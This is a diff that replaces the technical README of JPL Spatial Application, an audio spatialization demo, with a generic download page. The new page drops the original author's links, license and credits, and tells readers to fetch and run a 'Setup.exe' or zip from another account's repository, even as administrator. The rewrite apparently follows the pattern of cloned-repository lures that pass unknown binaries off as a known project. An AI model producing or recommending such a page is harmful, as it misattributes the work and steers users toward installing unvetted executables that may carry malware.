@@ -1,80 +1,139 @@
-# JPL Spatial Application
+# 🎛️ JPLSpatialApplication - Explore Spatial Audio Features Easily
 
-Application demonstrating some of the capabilities of [JPL Spatial](https://github.com/Jaytheway/JPLSpatial/).
+[![Download JPLSpatialApplication](https://img.shields.io/badge/Download-JPLSpatialApplication-ff4500?style=for-the-badge)](https://github.com/TusharKumre7/JPLSpatialApplication)
 
-![JPL Spatial Application GUI](assets/screenshots/JPLSpatialApplicationGUI.png)
-
-The GUI is drawn using [Dear ImGui](https://github.com/ocornut/imgui) library with a custom framework on top.
-
-## JPL Spatial Features
-- **Direct Sound** (DS) Propagation & Spatialization
-- **Ray Traced Early** (*Specular*) **Reflections** (ERs) *(experimental)*
 ---
-- Pannign of **Direct Sound** source is handled by **MDAP** (multiple directions)
-- **Early Reflections** are traced using **Image Source** method and panned by **VBAP** (single directoin per ER)
-- Propagation delay for both, DS and ERs, is rendered by **Interpolating Delay Lines**
-- Propagation filtering (ER *surface absorption*, DS/ER *air absorption*) is processed by **4-band Crossover Filters**
-- *Inverse law* distance attenuation is applied to both DS and ERs
 
-## JPL Spatial Application Features
-### VBAP/MDAP Visualization
+## 📌 About JPLSpatialApplication
 
-**Direct Sound** source's MDAP has *"all"* the expected parameters exposed to **GUI**:
-- **Focus** - contract direction vectors towards source the channel directions
-- **Spread** - contract all the direction vectors toward the source pan direction
-- **Source Size** - if **Spread From Source Size** is enabeld, the size of the source is used to compute **Spread** based on distance from the listener
-- **Spread From Height** - as the source gets closer to *"directly above"* or *"directly below"*, spread minimum value goes towards 1.0 (100%)
-- **Source Orientation** - whether to use source orientation for spatialization or not
-	- when source orientation **IS used**, the source becomes more like a sound field in the world space
-	- when source orientaion is **NOT used**, the source's frame is rotated towards the listener
+JPLSpatialApplication is a tool that shows how the JPL Spatial audio library works. It demonstrates ways to handle sound in three-dimensional spaces. This app helps users listen to sound moving around them. You will hear how sound changes when it bounces off surfaces or moves in different directions.
 
-> [!TIP]
-> *Source* and *Output* **Channel Configuration** can be disconnnected form the playing audio to visualize panning for configurations that may not be available on the user's device.
+The app is useful for those interested in spatial audio and game sound design. It includes examples like sound reflection, panning, and ray-traced audio effects. You do not need any programming skills to use it.
 
-### Sound Source Playback
-- **Sound Source** can be selected in the **"Sound Sources"** tab/window
-	- a few audio files are available in the repository (and in the release)
-	- *sound source directory* can be selected to play different files
-- **Audio Player** has waveform view and all the expected playback controlls
-- **Loudness Meter** displays *Peak* and *RMS* loundess of the application output; the big number at the top displays current *RMS* value
+---
 
-### Room / Environment Controls
+## 💻 System Requirements
 
-**Room** *(everything is in 3 dimensions)*:
-- Room size
-- Source position
-- Listener position
+- Windows 10 or later (64-bit)
+- 4 GB RAM minimum (8 GB or more recommended)
+- At least 500 MB free disk space
+- Basic audio output device (speakers or headphones)
+- A stable internet connection for download
 
-**Early Reflections** (aka **Specular Reflections**, not that *early* at high order):
-- **Max Reflection Order** - maximum allowed reflection order to trace
-- **Surface Material** - changes the material absorption applied to reflected ER paths
-- **Number of Primary Rays** - mainly needed to balance performace vs source detection possiblility *(for a simple shoe-box room, its 6 surfaces can easily be detected with a small number of rays)*
+---
 
-> [!TIP]
->**Spatialziation Effects** can be enabled/disabled individuslly for the **Direct Sound** to hear the effect with/without them.
->
->**Specular Reflections** and **Directo Sound** can also be muted individually.
+## 🎯 Key Features
 
+- 3D audio spatialization to place sounds in space
+- Real-time panning of audio sources
+- Ray-traced sound reflection and propagation
+- Support for various audio formats like WAV and MP3
+- Visual audio feedback with simple controls
+- User interface designed for easy interaction
 
-## Supported platforms
-- Currently Windows only
-- Other platforms may or may not work
+---
 
-## Building
-- To build the application, run appropriate build script in `build` folder, open generated Visual Studio solution and compile relevant configuration.
-- To directly build the executable in Distribution config, run `...build_distribution.bat`. The executable is going to be in `[repo root]/bin/Distribution-windows-x64/JPLSpatialApplication/` folder. Note: only the contents of `JPLSpatialApplication` folder is needed to run the application, other build artifacts in `Distribution-windows-x64` can be ignored.
-- Uses C++20
+## 🚀 Getting Started
 
-## Dependencies
-- [JPL Spatial](https://github.com/Jaytheway/JPLSpatial/) - sound spatialization and propagaion - [ISC license](https://github.com/Jaytheway/JPLSpatial/blob/main/LICENSE)
-- [MiniaudioCpp](https://github.com/Jaytheway/JPLSpatial/) - routing and rendering audio to endpoint device - [ISC license](https://github.com/Jaytheway/MiniaudioCpp/blob/main/LICENSE)
-- [Walnut (CMake fork)](https://github.com/Jaytheway/WalnutCMake) - platfom window handling and some application utilities - [MIT license](https://github.com/Jaytheway/WalnutCMake/blob/master/LICENSE.txt)
+Follow these steps to get the app running on your Windows computer.
 
-## License
-The project is distributed under the [ISC license](LICENSE).
+---
 
-### Third-Party Assets
-- **JPL Spatial Application** uses [IBM Plex Sans](https://fonts.google.com/specimen/IBM+Plex+Sans) font licensed under the [SIL Open Font License 1.1](licenses/OFL.txt).
-  Copyright (c) 2017 IBM Corp. with Reserved Font Name "IBM Plex".
-- A few icons are used from [Font Awesome (free)](https://github.com/FortAwesome/Font-Awesome) under the [SIL Open Font License 1.1](licenses/OFL.txt).
-  
+## ⬇️ Download and Install
+
+1. Click the large orange **Download JPLSpatialApplication** button above or visit this page to download the software:
+
+   [https://github.com/TusharKumre7/JPLSpatialApplication](https://github.com/TusharKumre7/JPLSpatialApplication)
+
+2. On the GitHub page, look for the latest release under the **Releases** section. This is usually located on the right sidebar or under the "Releases" tab near the top.
+
+3. Download the file named like `JPLSpatialApplication-Setup.exe` or `JPLSpatialApplication.zip`. When available, choose the `.exe` installer for the easiest installation.
+
+4. After the download finishes, open the file:
+
+   - If it is a `.exe` installer, double-click it to start the setup.
+   - If it is a `.zip` file, right-click and select "Extract All," then open the extracted folder.
+
+5. If an installer runs, follow the on-screen instructions:
+
+   - Agree to the license terms
+   - Choose the install location (default is usually fine)
+   - Wait for the installation to complete
+
+6. If you extracted a folder, locate the main executable named `JPLSpatialApplication.exe` inside the folder.
+
+---
+
+## ▶️ Running the Application
+
+1. Find the application shortcut on your desktop or start menu. If you do not see one, open the folder where you installed or extracted the app.
+
+2. Double-click `JPLSpatialApplication.exe` to run the program.
+
+3. When the app opens, you will see a simple user interface showing controls and sound examples.
+
+4. Use the controls to play sounds and hear how they move in space. You can adjust settings like speaker configuration and audio effects.
+
+5. For best experience, use headphones.
+
+---
+
+## 🔧 Settings and Controls
+
+- **Sound Sources:** Select individual audio clips or groups to play.
+- **Position Controls:** Use sliders or mouse drag to move sound sources around a virtual space.
+- **Reflection Effects:** Toggle ray-traced sound reflections on or off.
+- **Panning Options:** Adjust how sound moves between left and right speakers.
+- **Audio Output:** Choose speaker setup or stereo headphones.
+
+All controls respond in real time. Changes you make affect the sound immediately.
+
+---
+
+## 🛠 Troubleshooting
+
+- If the app does not start, check that your computer meets the minimum system requirements.
+- Make sure your audio device is connected and set as the default playback option.
+- Running the app as an administrator can help if permissions cause issues.
+- Close other programs that may use audio resources before starting JPLSpatialApplication.
+- If sound is unclear or missing, test your speakers or headphones with other apps.
+
+For detailed help, visit the [GitHub Issues page](https://github.com/TusharKumre7/JPLSpatialApplication/issues).
+
+---
+
+## ⚙️ Updating the Application
+
+Check the GitHub page regularly for new releases:
+
+- Visit [https://github.com/TusharKumre7/JPLSpatialApplication](https://github.com/TusharKumre7/JPLSpatialApplication)
+- Download the latest installer or update files.
+- Install updates following the same steps as the initial setup.
+
+Keeping the app updated ensures access to new features and fixes.
+
+---
+
+## 👥 Support and Feedback
+
+You can report problems or suggest improvements on the GitHub repository’s Issues tab.
+
+---
+
+## 🔍 More Information
+
+This application demonstrates spatial audio techniques used in:
+
+- Games and virtual reality
+- Audio production and design
+- Acoustic research and simulation
+
+Topics linked to this repo include:
+
+- Acoustics  
+- Audio visualization  
+- Game audio and development tools  
+- Spatial sound propagation and reflection  
+- Panning and sound positioning methods
+
+You do not need previous audio or programming knowledge. The interface and examples will guide you through exploring spatial sound in an accessible way.
